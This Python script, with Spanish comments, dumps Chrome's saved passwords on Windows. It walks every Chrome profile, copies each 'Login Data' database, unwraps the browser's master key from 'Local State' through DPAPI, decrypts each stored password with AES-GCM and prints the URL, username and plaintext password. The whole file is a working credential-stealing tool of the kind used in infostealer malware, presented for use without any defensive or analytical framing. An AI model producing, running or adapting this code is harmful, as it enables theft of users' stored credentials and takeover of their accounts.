# Created by Alejandro Gonzales

import sqlite3
import os
import shutil
import win32crypt
from Crypto.Cipher import AES
import json
import base64

# Ruta para obtener la clave para descifrar las credenciales
CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))

path_chrome = os.path.join(os.getenv('LOCALAPPDATA'), r'Google\Chrome\User Data\\')
temp_file = "tmp_file"

# Obteniendo Clave para el descifrado
def get_secret_key():
    try:
        #(1) Get secretkey from chrome local state
        with open( CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        #Remove suffix DPAPI
        secret_key = secret_key[5:] 
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception as e:
        print("%s"%str(e))
        print("[ERR] Chrome secretkey cannot be found")
        return None
    
def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt(ciphertext, secret_key):
    try:
        #(3-a) Initialisation vector for AES decryption
        initialisation_vector = ciphertext[3:15]
        #(3-b) Get encrypted password by removing suffix bytes (last 16 bits)
        #Encrypted password is 192 bits
        encrypted_password = ciphertext[15:-16]
        #(4) Build the cipher to decrypt the ciphertext
        cipher = generate_cipher(secret_key, initialisation_vector)
        decrypted_pass = decrypt_payload(cipher, encrypted_password)
        decrypted_pass = decrypted_pass.decode()  
        return decrypted_pass
    
    except Exception as e:
        print("%s"%str(e))
        print("[ERR] Unable to decrypt, Chrome version <80 not supported. Please check.")
        return ""

# # Recorriendo directorio en busca de perfiles de usuarios
for profile_dir in os.listdir(path_chrome):
    profile_path = os.path.join(path_chrome, profile_dir)
    login_path_data = os.path.join(profile_path, 'Login Data')
    
    if os.path.isfile(login_path_data):
        shutil.copyfile(login_path_data, temp_file)

        conn = sqlite3.connect(temp_file)
        cursor = conn.cursor()
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")

        for datas in cursor.fetchall():
            url = datas[0]
            username = datas[1]
            password = decrypt(datas[2], get_secret_key())    
            # Si no hay credenciales no mostrar
            if password != "":
                print ("\n#########################")
                print (f"URL: {url}\nUSERNAME: {username}\nPASSWORD: {password}\n")

        conn.close()
        os.remove(temp_file)

